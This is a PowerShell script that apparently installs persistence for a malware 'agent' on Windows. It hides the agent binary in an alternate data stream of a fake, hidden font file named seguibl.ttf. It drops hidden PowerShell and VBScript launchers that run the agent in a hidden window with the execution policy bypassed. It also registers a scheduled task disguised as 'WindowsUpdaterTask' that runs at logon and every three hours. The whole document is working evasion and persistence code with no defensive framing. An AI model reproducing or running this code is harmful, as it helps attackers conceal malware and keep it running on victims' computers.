$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath not set."
    exit
}

# ---- 1. Fake font file & ADS ----
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
}
$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
    attrib +h $fontFile
}

$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte

# ---- 2. Launcher scripts ----
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# ---- 3. Scheduled task (logon + every 3 hours) ----
$taskName = "WindowsUpdaterTask"

# Delete any existing task with the same name
schtasks /delete /tn $taskName /f *>$null 2>&1

# Create the task: runs at logon and repeats every 3 hours indefinitely
$createCmd = "schtasks /create /tn `"$taskName`" /tr `"wscript.exe `"$vbsPath`"`" /sc onlogon /ru $env:USERNAME /f /it /ri PT3H /du 9999:59"
Invoke-Expression $createCmd *>$null 2>&1

if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Persistence installed: task '$taskName' will run at logon and every 3 hours."
} else {
    Write-Output "❌ schtasks failed with exit code $LASTEXITCODE."
}
